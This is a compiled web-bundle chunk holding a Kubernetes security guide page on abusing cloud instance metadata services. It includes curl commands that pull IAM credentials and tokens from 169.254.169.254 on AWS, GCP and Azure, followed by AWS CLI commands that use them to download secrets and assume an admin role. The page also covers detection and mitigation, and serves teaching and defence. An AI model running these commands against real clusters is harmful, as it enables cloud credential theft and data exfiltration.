"use strict";(globalThis.webpackChunkk_8_s_security=globalThis.webpackChunkk_8_s_security||[]).push([[9075],{8453(e,t,s){s.d(t,{R:()=>r,x:()=>c});var a=s(6540);const n={},i=a.createContext(n);function r(e){const t=a.useContext(i);return a.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:r(e.components),a.createElement(i.Provider,{value:t},e.children)}},8656(e,t,s){s.r(t),s.d(t,{assets:()=>l,contentTitle:()=>c,default:()=>u,frontMatter:()=>r,metadata:()=>a,toc:()=>o});const a=JSON.parse('{"id":"attack_vectors/cloud_metadata_service_abuse","title":"Cloud Metadata Service Abuse","description":"How attackers exploit cloud provider metadata services (IMDS) from Kubernetes pods to steal IAM credentials and escalate privileges.","source":"@site/docs/attack_vectors/cloud_metadata_service_abuse.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/cloud_metadata_service_abuse","permalink":"/docs/attack_vectors/cloud_metadata_service_abuse","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/cloud_metadata_service_abuse.md","tags":[{"inline":true,"label":"attack-vector","permalink":"/docs/tags/attack-vector"},{"inline":true,"label":"privilege-escalation","permalink":"/docs/tags/privilege-escalation"},{"inline":true,"label":"cloud-security","permalink":"/docs/tags/cloud-security"},{"inline":true,"label":"CKS","permalink":"/docs/tags/cks"}],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1770102262000,"sidebarPosition":21,"frontMatter":{"sidebar_position":21,"title":"Cloud Metadata Service Abuse","description":"How attackers exploit cloud provider metadata services (IMDS) from Kubernetes pods to steal IAM credentials and escalate privileges.","keywords":["kubernetes cloud security","IMDS attack","instance metadata service","AWS metadata","GCP metadata","Azure IMDS","cloud credential theft","IAM role theft","kubernetes privilege escalation","cloud security"],"tags":["attack-vector","privilege-escalation","cloud-security","CKS"],"related":["/docs/best_practices/cluster_setup_and_hardening/network_security/cloud_metadata_mitigation/","/docs/best_practices/cluster_setup_and_hardening/network_security/network_policies/","/docs/attack_vectors/service_account_token_abuse/","/docs/fundamentals/the_4_c_cloud_native_security/"]},"sidebar":"default","previous":{"title":"Exec/Attach Credential Theft","permalink":"/docs/attack_vectors/exec_attach_credential_theft"},"next":{"title":"Kubernetes Security Best Practices","permalink":"/docs/best_practices/intro"}}');var n=s(4848),i=s(8453);const r={sidebar_position:21,title:"Cloud Metadata Service Abuse",description:"How attackers exploit cloud provider metadata services (IMDS) from Kubernetes pods to steal IAM credentials and escalate privileges.",keywords:["kubernetes cloud security","IMDS attack","instance metadata service","AWS metadata","GCP metadata","Azure IMDS","cloud credential theft","IAM role theft","kubernetes privilege escalation","cloud security"],tags:["attack-vector","privilege-escalation","cloud-security","CKS"],related:["/docs/best_practices/cluster_setup_and_hardening/network_security/cloud_metadata_mitigation/","/docs/best_practices/cluster_setup_and_hardening/network_security/network_policies/","/docs/attack_vectors/service_account_token_abuse/","/docs/fundamentals/the_4_c_cloud_native_security/"]},c="Cloud Metadata Service Abuse",l={},o=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Verify Metadata Service Accessibility",id:"1-verify-metadata-service-accessibility",level:3},{value:"2. Retrieve IAM Credentials (AWS)",id:"2-retrieve-iam-credentials-aws",level:3},{value:"3. Retrieve IAM Credentials (GCP)",id:"3-retrieve-iam-credentials-gcp",level:3},{value:"4. Retrieve IAM Credentials (Azure)",id:"4-retrieve-iam-credentials-azure",level:3},{value:"5. Exfiltrate Sensitive Data Using Stolen Credentials",id:"5-exfiltrate-sensitive-data-using-stolen-credentials",level:3},{value:"6. Escalate Privileges in the Cloud Environment",id:"6-escalate-privileges-in-the-cloud-environment",level:3},{value:"Result",id:"result",level:3},{value:"Real-World Impact",id:"real-world-impact",level:2},{value:"Detection",id:"detection",level:2},{value:"Mitigation",id:"mitigation",level:2},{value:"References",id:"references",level:2}];function d(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(t.header,{children:(0,n.jsx)(t.h1,{id:"cloud-metadata-service-abuse",children:"Cloud Metadata Service Abuse"})}),"\n",(0,n.jsxs)(t.p,{children:["Cloud providers expose an Instance Metadata Service (IMDS) at a well-known IP address (",(0,n.jsx)(t.code,{children:"169.254.169.254"}),") that allows workloads to retrieve instance metadata, including temporary IAM credentials. In Kubernetes clusters running on cloud infrastructure (AWS EKS, GCP GKE, Azure AKS), pods can access this service by default, enabling attackers to steal cloud credentials and escalate privileges beyond the cluster."]}),"\n",(0,n.jsx)(t.p,{children:"This attack is particularly dangerous because compromised pods can obtain the same IAM permissions as the underlying node, potentially granting access to cloud resources like S3 buckets, databases, secrets managers, and other services."}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,n.jsx)(t.p,{children:"An attacker who has gained code execution inside a pod (through a vulnerability, misconfiguration, or compromised application) can exploit the metadata service to steal cloud credentials."}),"\n",(0,n.jsx)(t.h3,{id:"1-verify-metadata-service-accessibility",children:"1. Verify Metadata Service Accessibility"}),"\n",(0,n.jsx)(t.p,{children:"The attacker first confirms that the metadata service is reachable from within the pod:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"curl -s http://169.254.169.254/\n"})}),"\n",(0,n.jsx)(t.p,{children:"If accessible, this returns metadata API version paths."}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"2-retrieve-iam-credentials-aws",children:"2. Retrieve IAM Credentials (AWS)"}),"\n",(0,n.jsx)(t.p,{children:"On AWS EKS, the attacker queries the metadata service to retrieve the node's IAM role credentials:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"# Get the IAM role name\nROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n\n# Retrieve temporary credentials for the role\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME\n"})}),"\n",(0,n.jsx)(t.p,{children:"This returns:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-json",children:'{\n  "Code": "Success",\n  "AccessKeyId": "ASIAXXXXXXXXXXX",\n  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n  "Token": "FwoGZXIvYXdzEBYaDK...",\n  "Expiration": "2026-01-22T12:00:00Z"\n}\n'})}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"3-retrieve-iam-credentials-gcp",children:"3. Retrieve IAM Credentials (GCP)"}),"\n",(0,n.jsx)(t.p,{children:"On GCP GKE, the attacker queries the GCE metadata server:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:'curl -H "Metadata-Flavor: Google" \\\n  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"\n'})}),"\n",(0,n.jsx)(t.p,{children:"This returns an OAuth2 access token:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-json",children:'{\n  "access_token": "ya29.c.Kp8B...",\n  "expires_in": 3599,\n  "token_type": "Bearer"\n}\n'})}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"4-retrieve-iam-credentials-azure",children:"4. Retrieve IAM Credentials (Azure)"}),"\n",(0,n.jsx)(t.p,{children:"On Azure AKS, the attacker queries the Azure IMDS:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:'curl -H "Metadata: true" \\\n  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"\n'})}),"\n",(0,n.jsx)(t.p,{children:"This returns an Azure AD access token for the managed identity."}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"5-exfiltrate-sensitive-data-using-stolen-credentials",children:"5. Exfiltrate Sensitive Data Using Stolen Credentials"}),"\n",(0,n.jsx)(t.p,{children:"With the stolen credentials, the attacker can access cloud resources. For example, on AWS:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:'# Configure AWS CLI with stolen credentials\nexport AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXX"\nexport AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\nexport AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDK..."\n\n# List S3 buckets\naws s3 ls\n\n# Download sensitive data\naws s3 cp s3://company-secrets/credentials.json ./\n\n# Access Secrets Manager\naws secretsmanager get-secret-value --secret-id production/database\n'})}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"6-escalate-privileges-in-the-cloud-environment",children:"6. Escalate Privileges in the Cloud Environment"}),"\n",(0,n.jsx)(t.p,{children:"Depending on the node's IAM permissions, the attacker may be able to:"}),"\n",(0,n.jsxs)(t.ul,{children:["\n",(0,n.jsx)(t.li,{children:"Access databases (RDS, Cloud SQL, Cosmos DB)"}),"\n",(0,n.jsx)(t.li,{children:"Read secrets from cloud secret managers"}),"\n",(0,n.jsx)(t.li,{children:"Modify cloud infrastructure (EC2, Compute Engine, VMs)"}),"\n",(0,n.jsx)(t.li,{children:"Access container registries (ECR, GCR, ACR)"}),"\n",(0,n.jsx)(t.li,{children:"Assume other IAM roles for further privilege escalation"}),"\n"]}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"# Attempt to assume another role (AWS)\naws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole \\\n  --role-session-name AttackerSession\n"})}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,n.jsx)(t.p,{children:"The attacker gains access to cloud IAM credentials with the same permissions as the Kubernetes node. This can lead to:"}),"\n",(0,n.jsxs)(t.ul,{children:["\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Data exfiltration"})," from cloud storage and databases"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Lateral movement"})," to other cloud services and accounts"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Cluster compromise"})," by accessing secrets or modifying infrastructure"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Persistent access"})," by creating new IAM users or roles"]}),"\n"]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"real-world-impact",children:"Real-World Impact"}),"\n",(0,n.jsx)(t.p,{children:"This attack vector has been exploited in several high-profile breaches:"}),"\n",(0,n.jsxs)(t.ul,{children:["\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Capital One (2019)"}),": An attacker exploited SSRF to access EC2 metadata and steal credentials, leading to the exposure of 100 million customer records."]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Numerous bug bounty findings"}),": IMDS attacks are commonly reported in cloud-hosted applications."]}),"\n"]}),"\n",(0,n.jsx)(t.p,{children:"The attack affects any pod running on cloud infrastructure unless explicit mitigations are in place."}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"detection",children:"Detection"}),"\n",(0,n.jsx)(t.p,{children:"Signs of metadata service abuse include:"}),"\n",(0,n.jsxs)(t.ul,{children:["\n",(0,n.jsxs)(t.li,{children:["Unusual network traffic to ",(0,n.jsx)(t.code,{children:"169.254.169.254"})," from pods"]}),"\n",(0,n.jsx)(t.li,{children:"CloudTrail/Cloud Audit logs showing API calls from unexpected source IPs"}),"\n",(0,n.jsx)(t.li,{children:"IAM credential usage from locations or services that don't normally access them"}),"\n",(0,n.jsx)(t.li,{children:"Failed authentication attempts with node-level credentials"}),"\n"]}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:'# Check Falco logs for metadata service access attempts\nkubectl logs -n falco -l app.kubernetes.io/name=falco --tail=1000 | grep "169.254.169.254"\n'})}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,n.jsx)(t.p,{children:"For guidance on how to prevent this attack vector, refer to the mitigation article:"}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/network_security/cloud_metadata_mitigation/",children:"Cloud Metadata Service Mitigation"})}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"references",children:"References"}),"\n",(0,n.jsx)(t.p,{children:"This article is based on information from the following official sources:"}),"\n",(0,n.jsxs)(t.ol,{children:["\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.a,{href:"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html",children:"Instance Metadata and User Data"})," - AWS Documentation"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.a,{href:"https://cloud.google.com/compute/docs/metadata/overview",children:"Storing and retrieving instance metadata"})," - Google Cloud Documentation"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.a,{href:"https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service",children:"Azure Instance Metadata Service"})," - Microsoft Azure Documentation"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.a,{href:"https://aws.github.io/aws-eks-best-practices/security/docs/iam/#restrict-access-to-the-instance-profile-assigned-to-the-worker-node",children:"EKS Best Practices Guide - Restrict access to the instance profile"})," - AWS EKS Best Practices"]}),"\n"]})]})}function u(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,n.jsx)(t,{...e,children:(0,n.jsx)(d,{...e})}):d(e)}}}]);